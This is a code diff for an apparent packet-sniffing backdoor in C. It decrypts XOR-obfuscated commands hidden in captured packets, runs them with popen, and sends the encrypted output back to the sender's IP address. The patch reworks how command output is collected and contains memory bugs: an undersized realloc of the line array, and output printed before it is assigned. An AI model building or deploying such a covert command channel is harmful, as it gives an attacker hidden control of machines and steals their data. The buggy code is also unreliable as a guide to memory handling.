@@ -19,31 +19,34 @@
  *      const char *command: The command to execute.
  *      char **result: The pointer the the output buffer pointer.
  */
-void execute_command(const char *command, char **result)
+char** execute_command(const char *command, int *size)
 {
     FILE *fp;
     const int MAX_LINE_LEN = 1024;
     char line_buffer[MAX_LINE_LEN];
+    char **temp = NULL;
+    char **result = NULL;
 
     fp = popen(command, "r");
 
-    // get the first line to determine the first malloc size
-    if (!fgets(line_buffer, MAX_LINE_LEN, fp)) return;
-    *result = (char*)malloc(sizeof(char) * strlen(line_buffer));
-    strcpy(*result, line_buffer);
-
     // grab all the lines and realloc and concat string as needed
+    int i = 1;
     while (fgets(line_buffer, MAX_LINE_LEN, fp))
     {
-        *result = (char*)realloc(*result, strlen(*result) + strlen(line_buffer) + 1);
-        if (!*result)
+        temp = realloc(result, strlen(line_buffer));
+        if (!temp) 
         {
-            return;
+            perror("realloc");
+            return NULL;
         }
-        strcat(*result, line_buffer);
+        result = temp;
+        result[i - 1] = malloc(strlen(line_buffer) + 1);
+        strcpy(result[i - 1], line_buffer);
+        i++;
     }
-
+    *size = i - 1;
     pclose(fp);
+    return result;
 }
 
 
@@ -61,9 +64,11 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     char payload_buffer[MAX_COMMAND_LEN];
     char decrypted[MAX_COMMAND_LEN];
 
+    char **command_output_ptr;
     char *command_output;
     char *encrypted_command_output;
 
+    int command_output_size;
     int tcp_sport;
     unsigned int tcp_seqnum;
 
@@ -112,11 +117,24 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     strncpy(command, payload, end_ptr - payload);
 
     // Step 6: Execute the command
-    execute_command(command, &command_output);
+    command_output_ptr = execute_command(command, &command_output_size);
     printf("Command executed:\n%s\n", command_output);
 
+    int total_size = 0;
+    int offset = 0;
+    for (int i = 0; i < command_output_size; i++)
+    {
+        total_size += (strlen(command_output_ptr[i]) + 1);
+    }
+
+    // Allocate a string to hold all the strings in the list
+    command_output = malloc(total_size);
+    for (int i = 0; i < command_output_size; i++) 
+    {
+        offset += sprintf(command_output + offset, "%s", command_output_ptr[i]);
+    }
     // Step 7: Send the results back
-    encrypted_command_output = (char*)malloc(sizeof(command_output));
+    encrypted_command_output = malloc(total_size);
     xor_string(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, strlen(command_output));
     send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output, strlen(encrypted_command_output));
 
